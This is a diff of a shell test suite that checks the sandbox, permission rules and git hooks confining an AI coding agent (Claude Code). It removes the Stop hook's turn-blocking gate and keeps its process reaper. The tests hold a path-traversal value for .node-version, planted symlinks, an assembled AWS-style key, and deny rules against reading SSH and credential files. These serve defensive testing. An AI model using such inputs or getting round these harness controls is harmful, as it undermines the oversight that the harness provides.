@@ -5,14 +5,11 @@ unset GIT_INDEX_FILE GIT_DIR GIT_WORK_TREE # a `commit -a` hands its own index d
 # A `git merge` hands its hooks GIT_REFLOG_ACTION: left set, it renames every reflog entry, and `checkout -` finds no
 # branch before (pathspec '-').
 unset GIT_REFLOG_ACTION
-# check.sh exports it, through records.sh: left set, it would hide a hook that does not (F144).
+# records.sh exports it for the hooks: left set by a caller, it would hide a hook that does not (F144).
 unset GIT_NO_REPLACE_OBJECTS
-# The hooks run the gate as they do in Claude Code's sandbox, the CI included; the sections
-# `outside` and `installed` run them as in Alexis's shell (F076, F129).
+# The hooks run as they do in Claude Code's sandbox, the CI included; the sections `outside` and `installed` run them as in Alexis's
+# shell (F076, F129).
 export SANDBOX_RUNTIME="${SANDBOX_RUNTIME:-test_hooks}"
-# The declaration checks (check_regressions, the Stop hook's gate) are opt-in since the speed plan
-# (Alexis, 2026-11-06): this suite tests them, so it runs them on.
-export GNOWORLD_STRICT=1
 export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t
 # No git config from around this file reaches its throwaway repositories (F5012, F5022, section `unsigned`): Alexis's global
 # one signs every commit with a key the sandbox cannot read; a system file, what `git -c` hands a hook, or a template folder
@@ -21,7 +18,6 @@ export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null
 unset GIT_CONFIG_PARAMETERS GIT_CONFIG_COUNT GIT_CONFIG GIT_TEMPLATE_DIR
 here=$(cd "$(dirname "$0")" && pwd)
 hooks=$(cd "$here/../.githooks" && pwd)
-rp="$here"/review_pass.py # review_pass and pre_push both use it
 secrets_into() { cp "$here/scan_secrets.sh" "$here/gitleaks.toml" "$here/gitleaks-private.toml" "$here/.gitleaksignore" "$1"; } # the secret scan, whole
 hook_names="commit-msg pre-commit pre-merge-commit pre-push" # git checks nothing where one is missing
 key="AKIA""J7Q2XRT4LMNB5VWZ" # assembled, so this file holds no key
@@ -82,6 +78,8 @@ import json, sys
 hooks = json.load(open(sys.argv[1]))["hooks"]
 wired = {event: " ".join(h["command"] for entry in hooks.get(event, []) for h in entry["hooks"]) for event in hooks}
 assert "scripts/guard.py" in wired["PreToolUse"] and "scripts/stop_gate.sh" in wired["Stop"]
+# The guard and the reaper are the hooks (D13173): nothing else runs outside the sandbox.
+assert set(wired) == {"PreToolUse", "Stop"}, f"a hook other than the guard and the reaper runs outside the sandbox: {sorted(set(wired) - {'PreToolUse', 'Stop'})}"
 # A hook runs outside the sandbox: none may run a tool a sandboxed command can rewrite (finding F038).
 assert not wired.get("PostToolUse"), "a PostToolUse hook runs outside the sandbox"
 PY
@@ -135,7 +133,7 @@ assert s["permissions"].get("blockWritesOutsideWorkingDirectories") is True, "th
 # A dependency is Alexis's to add, and rm -rf no one's.
 assert {"Bash(git push)", "Bash(git push *)"} <= ask, "a push asks no one"
 assert {"Bash(pnpm add *)", "Bash(rm -rf *)"} <= deny, "Claude can add a dependency or delete a tree"
-outside = {"Edit(/scripts/guard.py)", "Edit(/scripts/stop_gate.sh)", "Edit(/scripts/code_changed.sh)", "Edit(/.githooks/**)",
+outside = {"Edit(/scripts/guard.py)", "Edit(/scripts/stop_gate.sh)", "Edit(/.githooks/**)",
            "Edit(/scripts/scan_secrets.sh)", "Edit(/scripts/gitleaks.toml)", "Edit(/scripts/gitleaks-private.toml)", "Edit(/scripts/.gitleaksignore)",
            "Edit(/scripts/install_hooks.sh)", "Edit(/.git/hooks/**)", "Edit(/.git/config)", "Edit(/.git/commondir)", "Edit(/.mcp.json)",
            "Edit(/scripts/worktree.sh)", "Edit(/scripts/borrow_node_modules.sh)", "Edit(/CLAUDE.md)", "Edit(/CLAUDE.local.md)", "Edit(/.claude/CLAUDE.md)",
@@ -156,7 +154,7 @@ assert not edits(ask), "an edit asks Alexis: Claude works alone, and the files r
 # state in .claude/tmp or StrykerJS's copies of the package files (F111).
 import fnmatch
 for rule in edits(deny):
-    for written in ("/.claude/tmp/gate-green", "/.stryker-tmp/sandbox-x/app/package.json", "/.stryker-tmp/sandbox-x/packages/core/package.json"):
+    for written in ("/.claude/tmp/tsc/root.tsbuildinfo", "/.stryker-tmp/sandbox-x/app/package.json", "/.stryker-tmp/sandbox-x/packages/core/package.json"):
         assert not fnmatch.fnmatch(written, rule[5:-1]), f"{rule} bans the gate's own write to {written}"
 assert {f"mcp__{p}__gno_{t}" for p in ("gnomcp", "plugin_gnomcp_gnomcp") for t in ("addpkg", "call", "run", "key_send", "cla_sign")} <= ask, "a chain write asks no one"
 assert {"Read(~/.ssh/**)", "Read(~/.config/gh/**)"} <= deny, "the Read tool can open a credential"
@@ -207,28 +205,26 @@ fi
 mkdir -p "$t/form/scripts" "$t/form/.githooks"
 { cat "$0"; printf 'if part Regress2 ; then\nfi\n'; } >"$t/form/scripts/test_hooks.sh"
 ONLY=wiring sh "$t/form/scripts/test_hooks.sh" 2>&1 | grep -q "opened in a form the runner does not list" || fail "a section opened in another form would never run, unnoticed (F160)"
-# No caller hands check.sh an option, which it refuses since D13168: but pre-push's push of main, which 3b removes (D13164).
+# No caller hands check.sh an option, which it refuses since D13168.
 callers=$(grep -rnE 'scripts/check\.sh +-' "$hooks" "$here"/*.sh "$here/../.claude" "$here/../package.json" "$here/../.github" 2>/dev/null |
-	grep -vE '^[^:]*/test_hooks\.sh:|^[^:]*:[0-9]+:[[:space:]]*#|^[^:]*/\.claude/tmp/' | grep -vF "$hooks/pre-push:" || :)
+	grep -vE '^[^:]*/test_hooks\.sh:|^[^:]*:[0-9]+:[[:space:]]*#|^[^:]*/\.claude/tmp/' || :)
 [ -z "$callers" ] || fail "a caller hands check.sh an option it refuses: $callers"
 # check.sh runs every step it promises: removing one fails here.
 gate_file="$here/check.sh"
 for step in "run format:check" "named format:check --ignore-unknown" "run lint" "named lint --no-warn-ignored" "run typecheck" \
 	'sh -c "$tests --tags-filter=!timing"' 'sh -c "vitest related --run --passWithNoTests ${tests#vitest run } --tags-filter=!timing $related"' \
 	"python3 -I scripts/related.py --check" '| python3 -I scripts/related.py)' '"$GNO" lint ./...' '"$GNO" test ./...' "sh scripts/ergo.sh" \
-	"unset COVERAGE_ALL CORE_CHROMIUM" "start lint" "start types" "start tests" "start gno" 'gate_passed "$tested" false' \
+	"unset COVERAGE_ALL CORE_CHROMIUM" "start lint" "start types" "start tests" "start gno" \
 	"python3 -I scripts/check_docs.py" "ast.parse(open(f).read(), f) for f in sys.argv[1:]]' scripts/*.py" 'do sh -n "$f"; done'; do
 	grep -v '^[[:space:]]*#' "$gate_file" | grep -qF -- "$step" || fail "check.sh no longer runs: $step"
 done
-# One harness list, records.sh's: the night's harness_mutate judges each file of it, pre-push
-# wants each declared on main, merge.sh shows each first (F129), worktree.sh checks out none other
-# than its own tree's (F5098); every file harness_mutate guards is in it (F112, F114, F124), and
+# One harness list, records.sh's: the night's harness_mutate judges each file of it, pre-commit refuses each in the sandbox (D241),
+# worktree.sh checks out none other than its own tree's (F5098); every file harness_mutate guards is in it (F112, F114, F124), and
 # what Claude Code starts, .mcp.json's servers.
-python3 -I - "$gate_file" "$hooks/pre-push" "$hooks/merge.sh" "$hooks/records.sh" "$here/harness_mutate.py" "$here/worktree.sh" "$here/guard.py" "$here/../.claude/settings.json" <<'PY' || fail "a harness list other than records.sh's, or one missing a file harness_mutate guards"
+python3 -I - "$gate_file" "$hooks/pre-commit" "$hooks/pre-push" "$hooks/records.sh" "$here/harness_mutate.py" "$here/worktree.sh" "$here/guard.py" "$here/../.claude/settings.json" <<'PY' || fail "a harness list other than records.sh's, or one missing a file harness_mutate guards"
 import ast, fnmatch, json, re, sys
 text = lambda n: open(sys.argv[n]).read()
-assert 'harness --name-only "$remote_sha" "$local_sha"' in text(2), "pre-push has its own harness list"
-assert 'harness --name-only HEAD "$shown_tree"' in text(3), "merge.sh shows no harness list of what the merge does (D324)"
+assert "held=$(harness --cached --name-only)" in text(2), "pre-commit has its own harness list"
 assert 'harness --ignore-submodules=all --name-only "$base"' in text(6), "worktree.sh checks out a base's harness unseen"
 assert not [n for n in (1, 2, 3, 6, 7) if "pnpm-workspace.yaml" in text(n)], "a second harness list is left"
 assert '".githooks", "records.sh"' in text(7), "guard.py has its own harness list"
@@ -269,11 +265,7 @@ ignored = lambda f: any(fnmatch.fnmatchcase(f, s[1:]) if s.startswith("/") else 
 copies = [f for f in harnessed if not ignored(f) and any(b.match(".stryker-tmp/sandbox-x/" + f) for b in bans)]
 assert not copies, f"a write ban reaches StrykerJS's copies of {copies}, which a StrykerJS run writes (F111)"
 PY
-# check.sh prints the code it tests before its first step, and records it after its last one,
-# through records.sh, whose own cases are in the section `outside` (F076, F133).
 at() { grep -nF -- "$1" "$gate_file" | head -1 | cut -d: -f1; }
-[ "$(at '. .githooks/records.sh && tested=$(worktree_print)')" -lt "$(at 'start lint')" ] || fail "check.sh prints its code after a step ran (F133)"
-[ "$(at 'gate_passed "$tested" false')" -gt "$(at '[ -z "$failed" ] || exit 1')" ] || fail "check.sh records its code before its lanes ended (F076)"
 [ "$(at 'sh scripts/ergo.sh')" -lt "$(at 'sh -c "$tests --tags-filter=!timing"')" ] || fail "check.sh runs the tests before it builds the Ergo they start"
 # An EXIT trap keeps a failure: under macOS's sh, a plain one turns an unbound variable into exit 0.
 for f in "$here"/*.sh "$hooks"/*; do
@@ -285,9 +277,18 @@ for f in "$here"/*.sh "$hooks"/*; do
 	grep -nE '^[[:space:]]*[A-Za-z_]+=\$\(mktemp' "$f" | grep -vE 'mktemp (-d )?"\$\{TMPDIR:-/tmp\}/' | grep -q . && fail "$(basename "$f") makes a temporary file outside \$TMPDIR"
 done
 # check.sh refuses a .node-version that is more than a version, which would steer PATH.
-nv="$t/nodeversion" && mkdir -p "$nv/scripts" && cp "$gate_file" "$nv/scripts/check.sh"
+nv="$t/nodeversion" && mkdir -p "$nv/scripts" && cp "$gate_file" "$nv/scripts/check.sh" && git -C "$nv" init -q
 printf '24.22.0/../../../../evil\n' >"$nv/.node-version"
-sh "$nv/scripts/check.sh" 2>&1 | grep -q ".node-version must be a version" || fail "check.sh accepted a .node-version that is a path"
+env -u SANDBOX_RUNTIME sh "$nv/scripts/check.sh" 2>&1 | grep -q ".node-version must be a version" || fail "check.sh accepted a .node-version that is a path"
+# What left with D13173 stays gone, and no live file of the harness names it: a relic would run, or be read, as if it were there.
+for f in .githooks/merge.sh scripts/review_pass.py scripts/code_changed.sh scripts/dream_due.sh docs/review-passes.txt; do
+	[ ! -e "$here/../$f" ] || fail "$f is back, which D13173 removed"
+done
+relics=$(grep -rnE 'merge\.sh|review_pass|review-passes|review pass|code_changed|dream_due|GNOWORLD_STRICT|GNOWORLD_MERGE|GATE_CHANGED|green-(fast|full)|gate-green' \
+	"$hooks" "$here"/*.sh "$here"/*.py "$here/../.claude/settings.json" "$here/../.claude/commands" "$here/../.claude/agents" "$here/../.claude/workflows" \
+	"$here/../.claude/rules" "$here/../.github" "$here/../CLAUDE.md" "$here/../README.md" "$here/../docs/DEVELOPMENT.md" "$here/../docs/REVIEW.md" "$here/../docs/HARNESS.md" 2>/dev/null |
+	grep -vE '^[^:]*/(test_hooks\.sh|harness_mutate\.py):' || :)
+[ -z "$relics" ] || fail "a live file names what D13173 removed: $relics"
 # Every gno package is mutated, gno/p as well as gno/r: discovery names no area.
 grep -qF 'glob.glob("**/gnomod.toml"' "$here/mutate.py" || fail "mutate.py no longer mutates every gno package"
 fi
@@ -344,7 +345,7 @@ want_writes |= {f"{NEW}/*/{w}" for w in twin_writes} | {f"{NEW}/*/.git"} | {f"{N
 want_writes |= {f"{NEW}/.claude"}
 # The unlock opens these in a worktree (the main checkout keeps them closed); of .githooks, the hooks that guard main stay closed.
 OPENED = {"/.githooks/**", "/.claude/agents/**", "/.claude/commands/**", "/.claude/workflows/**", "/.claude/rules/**", "/**/.claude/rules/**",
-          "/scripts/stop_gate.sh", "/scripts/code_changed.sh", "/scripts/borrow_node_modules.sh"}
+          "/scripts/stop_gate.sh", "/scripts/borrow_node_modules.sh"}
 twin_rules = [(k, p) for k, p in own_rules if p not in OPENED] + [("Edit", f"/.githooks/{h}") for h in ("pre-commit", "pre-push", "records.sh")]
 want_rules = {f"{k}(/{w}/*{p})" for k, p in twin_rules for w in (WT, TMP_WT)} | {f"{k}({MAIN}{p})" for k, p in own_rules}
 want_rules |= {f"{k}({NEW}/*{p})" for k, p in twin_rules} | {f"Edit({NEW}/*/.git)"}
@@ -476,7 +477,7 @@ for p in (f"{WT}/csp.diff", "/private/tmp/claude-501/notes.md", f"{HOME}/Server/
 # What every session writes: its own tree's open files, a sibling's (the chief's docs and ledger in the integration worktree), the
 # gate's state and StrykerJS's copies, git's shared folder, the shared reports, the throwaway trees in $TMPDIR.
 for tree in (ROOT, f"{WT}/slice-7", f"{TMP_WT}/tomorrow", f"{NEW_HOME}/slice-7", f"{NEW_HOME}/tomorrow"):
-    for p in ("docs/review/findings.md", "docs/decisions.md", "docs/review-log.md", "adr/0003-x.md", "app/src/main.tsx", ".claude/tmp/gate-green",
+    for p in ("docs/review/findings.md", "docs/decisions.md", "docs/review-log.md", "adr/0003-x.md", "app/src/main.tsx", ".claude/tmp/tsc/root.tsbuildinfo",
               ".stryker-tmp/sandbox-x/app/package.json", ".stryker-tmp/sandbox-x/packages/core/package.json", "node_modules/.vite/x"):
         assert not refused(f"{tree}/{p}") and not denied("Edit", f"{tree}/{p}"), f"{tree}/{p} is closed"
 # A worktree's own folder stays open, to its making and to a rename: a glob holds no folder at its `*` (F4893, asked).
@@ -595,12 +596,12 @@ if others:
     os.symlink(sibling, os.path.join(scratch, "sibling"))
     for tree in (sibling, tmp(sibling), os.path.join(scratch, "sibling")):
         closed(os.path.join(tree, ".githooks", name))
-    for p in ("scripts/stop_gate.sh", ".claude/settings.json"):
+    for p in ("scripts/guard.py", ".claude/settings.json"):
         if os.path.isfile(os.path.join(sibling, p)):
             closed(os.path.join(sibling, p), append=True)
             closed(tmp(os.path.join(sibling, p)), append=True)
-    if os.path.isfile(os.path.join(sibling, "scripts/stop_gate.sh")):
-        closed(os.path.join(scratch, "linked"), link=os.path.join(sibling, "scripts/stop_gate.sh"))
+    if os.path.isfile(os.path.join(sibling, "scripts/guard.py")):
+        closed(os.path.join(scratch, "linked"), link=os.path.join(sibling, "scripts/guard.py"))
     for p in (".env", ".env.local"):
         if os.path.isfile(os.path.join(sibling, p)):
             unread(os.path.join(sibling, p))
@@ -691,7 +692,7 @@ else:
     near = [d for d in near if os.path.realpath(d) != own and not os.path.basename(d).startswith("probe-siblings-")]
     if near:
         closed(os.path.join(near[0], ".githooks", name))
-        for p in ("scripts/stop_gate.sh", ".claude/settings.json", "CLAUDE.md"):
+        for p in ("scripts/guard.py", ".claude/settings.json", "CLAUDE.md"):
             if os.path.isfile(os.path.join(near[0], p)):
                 closed(os.path.join(near[0], p), append=True)
         if os.path.isdir(os.path.join(near[0], "app")):
@@ -1234,81 +1235,28 @@ out=$(env -u GIT_CONFIG_GLOBAL -u GIT_CONFIG_SYSTEM HOME="$us/home" XDG_CONFIG_H
 [ ! -e "$us/signed" ] || fail "a throwaway repository called the signer of HOME's git config (F5021)"
 fi
 
-if part pre_commit; then
-# pre-commit: when mktemp fails, it stops before exporting anything. Fake
-# mktemp and git binaries make the failure happen without touching the disk.
-mkdir "$t/bin"
-printf '#!/bin/sh\nexit 1\n' >"$t/bin/mktemp"
-printf '#!/bin/sh\ncase $1 in diff) exit 1 ;; checkout-index) echo "$*" >>"%s/exported" ;; esac\n' "$t" >"$t/bin/git"
-printf '#!/bin/sh\nexit 0\n' >"$t/bin/gitleaks" # the secret scan passes, so mktemp is what fails
-chmod +x "$t/bin/mktemp" "$t/bin/git" "$t/bin/gitleaks"
-if PATH="$t/bin:$PATH" "$hooks/pre-commit" 2>/dev/null; then
-	fail "pre-commit passed though mktemp failed"
-fi
-[ ! -e "$t/exported" ] || fail "pre-commit exported the index after mktemp failed: $(cat "$t/exported")"
-fi
-
 if part stop_gate; then
-# stop_gate runs outside the sandbox, so it runs nothing a sandboxed command could write: it
-# compares the tree with the state check.sh last passed on. It passes on a second stop, on
-# docs-only changes, and on a state the gate passed; otherwise it blocks (exit 2).
+# stop_gate.sh, the Stop hook, only reaps since D13173: it runs outside the sandbox, so it runs nothing a sandboxed command could
+# write, and it never blocks a turn, whatever changed and whatever GNOWORLD_STRICT says (the turn's gate left).
+# It stops what runs of this project left behind, at the end of every turn (Alexis, 2026-10-29: six StrykerJS workers whose run was
+# killed spun at 75% of a core each for 31 hours, a vitest for 6 days; 18 reaped from 2026-10-29 to 11-13). The sandbox refuses ps;
+# this hook runs outside it. A process of this project names a folder `gnoworld/` (any case: the checkout, a session's scratchpad)
+# in its command, run by node. It is stopped when its parent is gone (PPID 1) and it is 30 minutes old or more (a session's server
+# started a moment ago is spared), 2 hours while a gate runs (sh, bash or ./ running scripts/check.sh, with a parent); or when it is a
+# test tool's (vitest, stryker, playwright, storybook), not in a dev or watch mode, 3 hours old or more, whatever its parent. TERM
+# first, KILL a second later. Each is logged to ~/Library/Logs/gnoworld-reaped.log, where the sandbox cannot write, as
+# `<pid> <seconds> <command>`. Nothing else: another project, an editor, this project's dev server, a young test tool whose run
+# lives. Here a fake ps, padded as ps pads, describes real sleeping processes.
 gate="$here"/stop_gate.sh
 r="$t/repo"
-mkdir -p "$r/scripts" "$r/docs" "$r/.claude/tmp"
+mkdir -p "$r/scripts" "$r/.claude/tmp" "$t/fakeps"
 printf '#!/bin/sh\ntouch "%s/gate-ran"\n' "$t" >"$r/scripts/check.sh"
-cp "$here/code_changed.sh" "$r/scripts/" && printf '.claude/tmp/\n' >"$r/.gitignore"
-git -C "$r" init -q && git -C "$r" add -A && git -C "$r" commit -qm init
-stop() { printf '%s' "$1" | CLAUDE_PROJECT_DIR="$r" sh "$gate" 2>/dev/null; }
-green() { (cd "$r" && sh scripts/code_changed.sh --state >.claude/tmp/gate-green); }
-echo note >"$r/docs/n.md"
-stop '{"stop_hook_active":false}' || fail "stop_gate blocked a docs-only change"
-echo 'package x' >"$r/x.go"
-code=0; stop '{"stop_hook_active":false}' || code=$?
-[ "$code" = 2 ] || fail "stop_gate did not block a code change the gate never passed (exit $code)"
+git -C "$r" init -q && echo 'package x' >"$r/x.go"
+printf '#!/bin/sh\nexit 0\n' >"$t/fakeps/ps" && chmod +x "$t/fakeps/ps" # no process at all, so the real ones are never read here
+stop() { printf '%s' "$1" | HOME="$t/home" PATH="$t/fakeps:$PATH" CLAUDE_PROJECT_DIR="$r" sh "$gate" 2>/dev/null; }
+stop '{"stop_hook_active":false}' || fail "stop_gate blocked a turn with code changed: it only reaps since D13173"
+(GNOWORLD_STRICT=1 stop '{"stop_hook_active":false}') || fail "stop_gate blocked a turn under GNOWORLD_STRICT=1, whose gate left (D13173)"
 [ ! -e "$t/gate-ran" ] || fail "stop_gate ran the repository's check.sh outside the sandbox"
-stop '{"stop_hook_active":true}' || fail "stop_gate blocked a second stop in a row"
-# Once per tree: a later turn that stops on the tree it blocked already learns nothing new.
-stop '{"stop_hook_active":false}' || fail "stop_gate blocked again a tree it had blocked once"
-green && { stop '{"stop_hook_active":false}' || fail "stop_gate blocked a state the gate passed"; }
-echo 'package y' >"$r/x.go"
-code=0; stop '{"stop_hook_active":false}' || code=$?
-[ "$code" = 2 ] || fail "stop_gate let through a change made after the gate passed (exit $code)"
-stop '{"stop_hook_active":false}' || fail "stop_gate blocked again a second tree it had blocked once"
-echo 'package z' >"$r/x.go"
-code=0; stop '{"stop_hook_active":false}' || code=$?
-[ "$code" = 2 ] || fail "stop_gate let a change through after a stop it had passed (exit $code)"
-echo 'package y' >"$r/x.go"
-code=0; stop '{"stop_hook_active":false}' || code=$?
-[ "$code" = 2 ] || fail "stop_gate let through a tree it blocked before another one (exit $code)"
-# A record it cannot write still blocks: a hook that fails otherwise lets the turn end.
-echo 'package w' >"$r/x.go" && rm -f "$r/.claude/tmp/gate-blocked" && mkdir "$r/.claude/tmp/gate-blocked"
-code=0; stop '{"stop_hook_active":false}' || code=$?
-[ "$code" = 2 ] || fail "stop_gate let a change through when it could not record the tree (exit $code)"
-rmdir "$r/.claude/tmp/gate-blocked"
-rm "$r/x.go" && echo '{}' >"$r/.claude/settings.json"
-code=0; stop '{"stop_hook_active":false}' || code=$?
-[ "$code" = 2 ] || fail "stop_gate let a settings.json change through (exit $code)"
-# Docs written or committed after the gate passed leave the code it passed on unchanged.
-green && echo more >>"$r/docs/n.md" && { stop '{"stop_hook_active":false}' || fail "stop_gate blocked a docs edit after the gate passed"; }
-git -C "$r" add docs/n.md && git -C "$r" commit -qm docs
-stop '{"stop_hook_active":false}' || fail "stop_gate blocked a docs-only commit after the gate passed"
-git -C "$r" add .claude/settings.json && git -C "$r" commit -qm settings && echo '{"a":1}' >"$r/.claude/settings.json"
-code=0; stop '{"stop_hook_active":false}' || code=$?
-[ "$code" = 2 ] || fail "stop_gate let a code change through after a commit (exit $code)"
-green && echo '{"a":2}' >"$r/.claude/settings.json"
-code=0; stop '{"stop_hook_active":false}' || code=$?
-[ "$code" = 2 ] || fail "stop_gate let an unstaged edit of a tracked file through (exit $code)"
-# It also stops what runs of this project left behind, at the end of every turn, before anything else (Alexis,
-# 2026-10-29: six StrykerJS workers whose run was killed spun at 75% of a core each for 31 hours, a vitest for 6 days).
-# The sandbox refuses ps; this hook runs outside it. A process of this project names a folder `gnoworld/` (any case:
-# the checkout, a session's scratchpad) in its command, run by node. It is stopped when its parent is gone (PPID 1) and it
-# is 30 minutes old or more (a session's server started a moment ago is spared), 2 hours while a gate runs (sh, bash or ./
-# running scripts/check.sh, with a parent); or when it is a test tool's (vitest, stryker, playwright, storybook), not in a
-# dev or watch mode, 3 hours old or more, whatever its parent. TERM first, KILL a second later.
-# Each is logged to ~/Library/Logs/gnoworld-reaped.log, where the sandbox cannot write, as `<pid> <seconds> <command>`.
-# Nothing else: another project, an editor, this project's dev server, a young test tool whose run lives. Here a fake ps,
-# padded as ps pads, describes real sleeping processes.
-mkdir -p "$t/fakeps"
 for n in 1 2 3 4 5 6 7 8 9 10 11 13 14 15 16; do sleep 60 </dev/null >/dev/null 2>&1 & eval "z$n=\$!"; done # nothing of the suite held open
 sh -c "trap '' TERM; while :; do sleep 1; done" </dev/null >/dev/null 2>&1 & z12=$! # a worker deaf to TERM
 table() { # $1: the line of a gate's run, or a line that only mentions one
@@ -1339,10 +1287,9 @@ fakeps() { # $1: its exit status; then table's argument
 }
 reap() { printf '{"stop_hook_active":true}' | HOME="$t/home" PATH="$t/fakeps:$PATH" CLAUDE_PROJECT_DIR="$r" sh "$gate" 2>/dev/null || fail "stop_gate failed while stopping what runs left behind"; }
 reaped="$t/home/Library/Logs/gnoworld-reaped.log"
-# What the sandbox can plant, the hook never writes through (security-S1, S2): a link at the log's old place and at the
-# blocked tree's record, to files outside the sandbox.
+# What the sandbox can plant, the hook never writes through (security-S1): a link at the log's old place, to a file outside it.
 printf 'mine\n' >"$t/victim" && ln -s "$t/victim" "$r/.claude/tmp/reaped.log"
-fakeps 0 "bash /srv/gnoworld/scripts/check.sh --full" && reap
+fakeps 0 "bash /srv/gnoworld/scripts/check.sh" && reap
 for z in "$z2" "$z7" "$z11" "$z12"; do gone "$z" || fail "stop_gate left $(grep "^ *$z " "$t/fakeps/table")"; done
 for z in "$z1" "$z6"; do alive "$z" || fail "stop_gate stopped a young orphan while a gate runs, maybe the gate's: $(grep "^ *$z " "$t/fakeps/table")"; done
 grep -q "^$z2 [0-9]* node /srv/gnoworld/" "$reaped" || fail "stop_gate did not log <pid> <seconds> <command>: $(cat "$reaped")"
@@ -1351,27 +1298,16 @@ grep -q "^$z2 532800 " "$reaped" || fail "stop_gate misread 6-04:00:00 as $(grep
 rm "$r/.claude/tmp/reaped.log"
 # A command that only mentions check.sh (an editor, a grep), or a check.sh whose own parent is gone, is no gate: the young
 # orphans go.
-fakeps 0 "sh scripts/check.sh --merge" 1 && reap
+fakeps 0 "sh scripts/check.sh" 1 && reap
 for z in "$z1" "$z6"; do gone "$z" || fail "stop_gate took an orphaned check.sh for a live gate: $(grep "^ *$z " "$t/fakeps/table")"; done
 for n in 1 6; do sleep 60 </dev/null >/dev/null 2>&1 & eval "z$n=\$!"; done
 fakeps 0 "vim scripts/check.sh" && reap
 for z in "$z1" "$z6"; do gone "$z" || fail "stop_gate took a mention of check.sh for a gate: $(grep "^ *$z " "$t/fakeps/table")"; done
 for z in "$z3" "$z4" "$z5" "$z8" "$z9" "$z10" "$z13" "$z14" "$z15" "$z16"; do alive "$z" || fail "stop_gate stopped $(grep "^ *$z " "$t/fakeps/table")"; done
-# What fails in the cleanup never costs the gate's block: ps failing, the log unwritable.
-fakeps 1 && rm -f "$reaped" && mkdir -p "$reaped" && echo '{"a":3}' >"$r/.claude/settings.json"
-code=0; printf '{"stop_hook_active":false}' | HOME="$t/home" PATH="$t/fakeps:$PATH" CLAUDE_PROJECT_DIR="$r" sh "$gate" 2>/dev/null || code=$?
-[ "$code" = 2 ] || fail "stop_gate lost its block when ps failed and the log could not be written (exit $code)"
+# What fails in the cleanup never fails the turn: ps failing, the log unwritable.
+fakeps 1 && rm -f "$reaped" && mkdir -p "$reaped"
+stop '{"stop_hook_active":false}' || fail "stop_gate failed a turn when ps failed and its log could not be written"
 rmdir "$reaped"
-# The blocked tree's record, a link the sandbox planted: still blocked, and the file it points at untouched.
-rm -f "$r/.claude/tmp/gate-blocked" && ln -s "$t/victim" "$r/.claude/tmp/gate-blocked" && echo '{"a":4}' >"$r/.claude/settings.json"
-code=0; stop '{"stop_hook_active":false}' || code=$?
-[ "$code" = 2 ] && [ "$(cat "$t/victim")" = mine ] || fail "stop_gate wrote its blocked tree through a planted link, or let the change through (exit $code): $(cat "$t/victim")"
-rm -f "$r/.claude/tmp/gate-blocked"
-# .claude/tmp itself, a link the sandbox planted to a folder outside it: still blocked, nothing written there.
-mv "$r/.claude/tmp" "$r/.claude/tmp.real" && mkdir "$t/elsewhere" && ln -s "$t/elsewhere" "$r/.claude/tmp" && echo '{"a":5}' >"$r/.claude/settings.json"
-code=0; stop '{"stop_hook_active":false}' || code=$?
-[ "$code" = 2 ] && [ -z "$(ls -A "$t/elsewhere")" ] || fail "stop_gate wrote through a planted .claude/tmp, or let the change through (exit $code): $(ls -A "$t/elsewhere")"
-rm "$r/.claude/tmp" && mv "$r/.claude/tmp.real" "$r/.claude/tmp"
 for n in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16; do eval "kill -9 \$z$n" 2>/dev/null || :; done
 fi
 
@@ -1493,7 +1429,7 @@ row "| F1001 | 2026-10-27 | a | x.py:1 | a | claimed | — |
 | F1001 | 2026-10-27 | b | y.py:1 | b | claimed | — |" && fail "check_docs accepted a four-digit id used twice"
 row "| F1001 | 2026-10-27 | a | x.py:1 | a bug | fixed | \`$sha\`, its test |" || fail "check_docs refused a fixed finding of four digits naming its commit"
 # Every commit a row cites is one, whatever its status (slice 3 read a fix's first only); outside a repository,
-# pre-commit's staged copy, none can be checked.
+# a copy of the tracked files, none can be checked.
 blob=$(git -C "$d" rev-parse --short HEAD:scripts/real.sh) && full=$(git -C "$d" rev-parse HEAD)
 row "| F001 | 2026-10-17 | a | x.py:1 | a bug | rejected | as \`$sha\` shows |" || fail "check_docs refused a rejected finding citing a commit of the repo"
 row "| F001 | 2026-10-17 | a | x.py:1 | a bug | moot | as \`$full\` shows |" || fail "check_docs refused a full hash of a commit of the repo"
@@ -1822,14 +1758,14 @@ printf 'CLAUDE.local.md\n' >>"$n/.gitignore" && printf 'x\n' >"$n/app/CLAUDE.loc
 out=$(docs_at "$n") || fail "check_docs read a CLAUDE.local.md git ignores, which no commit holds: $out"
 git -C "$n" add -f app/CLAUDE.local.md && docs_at "$n" >/dev/null && fail "check_docs accepted a CLAUDE.local.md git ignores, added by force"
 git -C "$n" rm -q --cached app/CLAUDE.local.md
-# Outside a repository (pre-commit's staged copy, which holds the tracked files alone): the same, every file read but node_modules',
+# Outside a repository (a copy that holds the tracked files alone): the same, every file read but node_modules',
 # at any depth, which the copy borrows (an installed package's AGENTS.md is no committed file; T4).
 c="$t/nested-copy" && mkdir -p "$c/node_modules/@cosmjs/math" "$c/app/node_modules/p" "$c/packages/core/node_modules/p" && : >"$c/CLAUDE.md" && good_rules "$c"
 printf 'x\n' >"$c/node_modules/@cosmjs/math/AGENTS.md" && printf 'x\n' >"$c/app/node_modules/p/AGENTS.md" && printf 'x\n' >"$c/packages/core/node_modules/p/CLAUDE.md"
-out=$(docs_at "$c") || fail "check_docs read a package's instruction file in the staged copy's borrowed node_modules: $out"
+out=$(docs_at "$c") || fail "check_docs read a package's instruction file in a copy's borrowed node_modules: $out"
 printf 'x\n' >"$c/app/CLAUDE.md"
 out=$(docs_at "$c") && fail "check_docs accepted an instruction file below the root of a copy outside a repository"
-printf '%s' "$out" | grep -qF "app/CLAUDE.md" || fail "check_docs did not name app/CLAUDE.md in the staged copy: $out"
+printf '%s' "$out" | grep -qF "app/CLAUDE.md" || fail "check_docs did not name app/CLAUDE.md in a copy outside a repository: $out"
 fi
 
 if part harness_mutate; then
@@ -1894,7 +1830,7 @@ printf 'KEEP1 KEEP2 KEEP3 SPARE\n' >"$hs/src/g.txt" && printf 'KEEP4 SPARE2\n' >
 printf 'LINE1\nLINE2\n' >"$hs/src/m.txt"
 cp "$here/harness_mutate.py" "$here/suite_parts.py" "$hs/repo/"
 # The worktrees: copies, logged when made and when removed; BREAK_SECOND=<suite> breaks the second one. Beside
-# the real repo_files.py, whose last_reviewed this run reads: the stub's worktree is the later definition.
+# the real repo_files.py: the stub's worktree is the later definition.
